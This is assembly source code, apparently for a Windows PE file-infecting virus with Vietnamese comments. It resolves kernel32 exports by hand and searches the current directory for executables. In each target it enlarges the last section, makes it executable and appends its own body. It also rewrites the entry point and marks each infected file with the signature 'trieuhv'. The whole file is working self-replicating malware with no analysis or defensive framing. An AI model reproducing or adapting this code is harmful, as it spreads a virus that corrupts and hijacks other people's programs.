.586p
.model FLAT, stdcall
Extern VirtualProtect@16:NEAR
Data segment
oldProtect				dword ?
DATA ends
TEXT segment
START :
push offset oldProtect
push 40h; 40h = EXECUTE_READWRITE
mov eax, offset endShellCode
mov ebx, offset startShellCode
sub eax, ebx
push eax
mov eax, offset startShellCode
push eax
call VirtualProtect@16

startShellCode:
call tdelta
tdelta:
pop eax
sub eax, offset tdelta
mov[offset delta + eax], eax
mov esi, eax

code :
; lay dia chi ham goi cua kernel32.dll; ---------------------------------- -
pop eax
push eax
and eax, 0ffff0000h; eax dang tro toi.PEHeader of kernel32.dll

; ds = data segment of FILE will be virus <ds of FILE host>

find_kernel32:
cmp word ptr[eax], "ZM"
jne find_continues
mov edi, [eax + 3Ch]
add edi, eax
mov ebx, [edi]
cmp ebx, "EP"

je finded_kernel32
find_continues :
sub eax, 10000h

jmp find_kernel32
finded_kernel32 :
; -- - eax = VA of Kernel32.dll------------------------------------------------ -

; VA ImageBaseKernelInMem = eax
mov[ImageBaseKernel + esi], eax
; VA PEsignature = edi
mov[PEsignature + esi], edi

; RVA ExportTableInFile = dword prt[VA PEsignature + 78h] .. <in FILE : 78h = offset RVA Export table addess - offset PeSignature>
mov ebx, [edi + 78h]
; VA ImageBaseKernelInFile = dw ptr[VA PEsignature + 34h]  .. <in FILE : 34h = offset ImageBase - offset PeSignature>
mov ecx, [edi + 34h]
; offset ImageBase = VA ImageBaseKernelInMem - VA ImageBaseKernelInFile
sub eax, ecx
; VA ExportTableInMem = RVA ExportTableInFile + VA ImageBaseInFile + offset ImageBase
add ebx, ecx
add ebx, eax; ebx = ExportTable

; ------read "Export table" of kernel to find "LoadLibrary"---------------- -
; read dword in position 9 = ENT->find function by name
mov[ExportTable + esi], ebx
mov edi, ebx

mov ebx, [edi + 28]
add ebx, [ImageBaseKernel + esi]
mov[EAT + esi], ebx; save VA EAT table
mov ebx, [edi + 32]
add ebx, [ImageBaseKernel + esi]
mov[ENT + esi], ebx; save VA ENT table
mov ebx, [edi + 36]
add ebx, [ImageBaseKernel + esi]
mov[EOT + esi], ebx; save VA EOT table

mov eax, [ENT + esi]
sub eax, 4
mov edx, [EOT + esi]
sub edx, 2
whileFindFuncName:
add edx, 2
add eax, 4
mov ebx, [eax]; ebx = RVA of 1 Name function
add ebx, [ImageBaseKernel + esi]; ->ebx point to VA Name function export
mov ecx, [ebx]

cmp ecx, "PteG"
je find_continues1
jmp whileFindFuncName
find_continues1 :
mov ecx, [ebx + 4]
cmp ecx, "Acor"
je find_continues2
jmp whileFindFuncName
find_continues2 :
mov ecx, [ebx + 8]
cmp ecx, "erdd"
je find_continues3
jmp whileFindFuncName
find_continues3 :
xor ecx, ecx
mov cx, word ptr[ebx + 12]
cmp cx, "ss"
je break_FindFuncName
jmp whileFindFuncName

break_FindFuncName :
mov cx, word ptr[edx]

mov edx, [EAT + esi]
while_findAddr :
	add edx, 4
	loop while_findAddr
	mov edx, [edx]
	add edx, [ImageBaseKernel + esi]
	mov[funcGetProcAddress + esi], edx

	; ....................................... set funcLoadLibrary
	mov eax, offset LoadLibraryA
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcLoadLibraryA + esi], eax

	; ........................................set funcVirtualProtect
	mov eax, offset VirtualProtect
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcVirtualProtect + esi], eax

	; ........................................load dll _ user32.dll
	mov eax, offset user32
	add eax, esi
	push eax
	call[funcLoadLibraryA + esi]
	mov[dll_user32 + esi], eax

	; ........................................set funcMessageBoxA
	mov eax, offset MessageBoxA
	add eax, esi
	push eax
	push[dll_user32 + esi]
	call[funcGetProcAddress + esi]
	mov[funcMessageBoxA + esi], eax

	; ........................................set funcCreateFile
	mov eax, offset CreateFile
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcCreateFile + esi], eax

	; ........................................set funcReadFile
	mov eax, offset ReadFile
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcReadFile + esi], eax

	; ........................................set funcWriteFile
	mov eax, offset WriteFile
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcWriteFile + esi], eax

	; ........................................set funcSetFilePointer
	mov eax, offset SetFilePointer
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcSetFilePointer + esi], eax

	; ........................................set funcCloseHandle
	mov eax, offset CloseHandle
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcCloseHandle + esi], eax

	; ........................................set funcCloseHandle
	mov eax, offset lstrcmp
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funclstrcmp + esi], eax

	; ........................................set funcFindFirstFileA
	mov eax, offset FindFirstFileA
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcFindFirstFileA + esi], eax

	; ........................................set funcFindNextFileA
	mov eax, offset FindNextFileA
	add eax, esi
	push eax
	push[ImageBaseKernel + esi]
	call[funcGetProcAddress + esi]
	mov[funcFindNextFileA + esi], eax
	; lay vr
	push[oldEnTryPoint + esi]
	push[newEntryPoint + esi]
	call searchFile
	pop[newEntryPoint + esi]
	pop[oldEnTryPoint + esi]
	push 0h
	mov eax, offset VRSignature
	add eax, esi
	push eax
	mov eax, offset msg
	add eax, esi
	push eax
	push 0
	call[funcMessageBoxA + esi]
	cmp esi, 0
	je	end_
	mov eax, offset startShellCode - offset end_ + 5
	add eax, [oldEnTryPoint + esi]
	sub eax, [newEntryPoint + esi]
	call delta_callback
	delta_callback :
pop ebx
add ebx, eax
push ebx
ret
end_ :
ret
searchFile proc
push esi
push eax
push ebx
push ecx
push edx

mov eax, offset FindData
add eax, esi
push eax
mov eax, offset PathFile
add eax, esi
push eax
call[funcFindFirstFileA + esi]
mov[hFindFile + esi], eax
jmp fileFirst

whileFindFile :
mov eax, offset FindData
add eax, esi
push eax
push[hFindFile + esi]
call[funcFindNextFileA + esi]

cmp eax, 0
je breakFindFile
fileFirst :
cmp dword ptr[FindData + esi], 10h
je  whileFindFile
cmp dword ptr[FindData + esi], 20h
jne koDinhDang

call layNhiemVr

koDinhDang :

jmp whileFindFile
breakFindFile :

pop edx
pop ecx
pop ebx
pop eax
pop esi

ret

searchFile endp
layNhiemVr proc

push esi
push eax
push ebx
push ecx
push edx


push 0
push 20h
push 3
push 0
push 1
push 0C0000000h
mov eax, offset FindData + 44
add eax, esi
push eax
call[funcCreateFile + esi]
mov[hFileHost + esi], eax
cmp eax, -1
je endInject

mov[Signature + esi], 0
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 2
mov eax, offset Signature
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]

mov eax, 0
mov ax, word ptr[offset Signature + esi]
cmp eax, 5a4dh
jne endInject

mov[shellSize + esi], offset endShellCode - offset startShellCode

push 0
push 0
push 3ch
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 4
mov eax, offset PESignatureHost
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]

; check PE
push 0
push 0
push[PESignatureHost + esi]
push[hFileHost + esi]
call[funcSetFilePointer + esi]

mov[Signature + esi], 0
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 4
mov eax, offset Signature
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]
cmp dword ptr[Signature + esi], "EP"
jne endInject

push 2
push 0
push - 15
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 14
mov eax, offset Signature
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]

mov eax, offset Signature
add eax, esi
push eax
mov eax, offset VRSignature
add eax, esi
push eax
call[funclstrcmp + esi]
je endInject
;read Section Alignment + File Alignment
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 38h
push eax
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 8
mov eax, offset SectionAlignment
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]

;read EntryPoint Host
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 28h
push eax
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 4
mov eax, offset oldEnTryPoint
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]

;read ImageSize Host
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 50h
push eax
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 4
mov eax, offset ImageSizeHost
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]


;read Number of Section
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 6h
push eax
push[hFileHost + esi]
call[funcSetFilePointer + esi]

mov[NumberOfSection + esi], 0
push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 2
mov eax, offset NumberOfSection
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]

; sua Section cuoi cung
mov ecx, [NumberOfSection + esi]
dec ecx
mov eax, [PESignatureHost + esi]
add eax, 0f8h + 8
lap_1:
add eax, 40
loop lap_1

push 0
push 0
push eax
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteRead
add eax, esi
push eax
push 32
mov eax, offset VirtualSize
add eax, esi
push eax
push[hFileHost + esi]
call[funcReadFile + esi]

; new RawSize,Virtual size,characteristic
mov[Characteristics + esi], 0E0000040h

mov eax, [shellSize + esi];
add[RawSize + esi], eax
; rawsize += Virus size
mov eax, [RawSize + esi];
mov edx, 0
div [FileAlignment + esi]; edx = phan du, eax = thuong

mov eax, [FileAlignment + esi]
sub eax, edx
add [RawSize + esi], eax
mov [numOfByteToFill + esi], eax

mov eax, [RawSize + esi]
mov [VirtualSize + esi], eax

push 1
push 0h
push - 32
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0; write to Section header
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 32
mov eax, offset VirtualSize
add eax, esi
push eax
push[hFileHost + esi]
call[funcWriteFile + esi]

push 2
push 0
push 0
push[hFileHost + esi]
call[funcSetFilePointer + esi]

mov ebx, [RawSize + esi]
add ebx, [RawAddress + esi]
cmp	eax, ebx
je fullAlignment
fullAlignment :
;ghi entry point
push 2
push 0
push 0
push[hFileHost + esi]
call[funcSetFilePointer + esi]
mov[hostSize + esi], eax
sub eax, [RawAddress + esi]
add eax, [VirtualAddress + esi]
mov[newEntryPoint + esi], eax

push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 28h
push eax
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 4
mov eax, offset newEntryPoint
add eax, esi
push eax
push[hFileHost + esi]
call[funcWriteFile + esi]

; ghi Image size
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 50h
push eax
push[hFileHost + esi]
call[funcSetFilePointer + esi]

mov eax, [VirtualAddress + esi]
add eax, [VirtualSize + esi]
cmp eax, [ImageSizeHost + esi]

jle not_write

mov eax, [ImageSizeHost + esi]
add eax, [SectionAlignment + esi]
mov[ImageSizeVr + esi], eax

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 4
mov eax, offset ImageSizeVr
add eax, esi
push eax
push[hFileHost + esi]
call[funcWriteFile + esi]

not_write:
;ghi vao cuoi file
push 2
push 0
push 0
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
mov eax, offset endShellCode
mov ebx, offset startShellCode
sub eax, ebx
push eax
mov eax, offset startShellCode
add eax, esi
push eax
push[hFileHost + esi]
call[funcWriteFile + esi]

;padding
mov ecx, [numOfByteToFill + esi]
pad:
push ecx
push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 1
mov eax, offset zero
add eax, esi
push eax
push[hFileHost + esi]
call[funcWriteFile + esi]
pop ecx
loop pad

;ki ten Design
push 2
push 0
push - 15
push[hFileHost + esi]
call[funcSetFilePointer + esi]

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 15
mov eax, offset VRSignature
add eax, esi
push eax
push [hFileHost + esi]
call [funcWriteFile + esi]

endInject:
push [hFileHost + esi]
call [funcCloseHandle + esi]

pop edx
pop ecx
pop ebx
pop eax
pop esi
ret

layNhiemVr endp

zero	db		0
msg	db		"Hello!", 0
delta dword ?
funcGetProcAddress	dword ?

user32		db	"user32.dll", 0
dll_user32 			dword ?
MessageBoxA db 	"MessageBoxA", 0
funcMessageBoxA dword ?
LoadLibraryA db 	"LoadLibraryA", 0
funcLoadLibraryA	dword ?
VirtualProtect	db		"VirtualProtect", 0
funcVirtualProtect	dword ?
CreateFile	db		"CreateFileA", 0
funcCreateFile	dword ?
ReadFile	db		"ReadFile", 0
funcReadFile	dword ?
WriteFile	db		"WriteFile", 0
funcWriteFile	dword ?
SetFilePointer	db	"SetFilePointer", 0
funcSetFilePointer	dword ?
CloseHandle	db	"CloseHandle", 0
funcCloseHandle	dword ?
lstrcmp		db	"lstrcmp", 0
funclstrcmp		dword ?
FindFirstFileA	db	"FindFirstFileA", 0
funcFindFirstFileA	dword ?
FindNextFileA	db	"FindNextFileA", 0
funcFindNextFileA dword ?

ImageBaseKernel	dword ?
PEsignature		dword ?
ExportTable dword ?
EAT	dword ?
ENT dword ?
EOT	dword ?


shellSize dword ?
hostSize dword ?

hFileHost dword ?
PESignatureHost dword ?
ImageSizeHost dword ?
ImageSizeVr	dword ?
oldEnTryPoint dword ?
newEntryPoint dword ?
NumberOfSection dword ?
SectionAlignment dword ?
FileAlignment dword ?
VirtualSize	dword ?
VirtualAddress dword ?
RawSize	dword ?
RawAddress dword ?
Free db 		12 dup(? )
Characteristics dword ?

numOfByteToFill	dword ?
numOfByteWritten dword ?
numOfByteRead dword ?

hFindFile dword ?
PathFile db 		".\*.*", 50 dup(0)
FindData db 		592 dup(? ), 0

Signature db		15 dup(0)
VRSignature	db		"trieuhv", 0
endShellCode :
	TEXT ends
	END START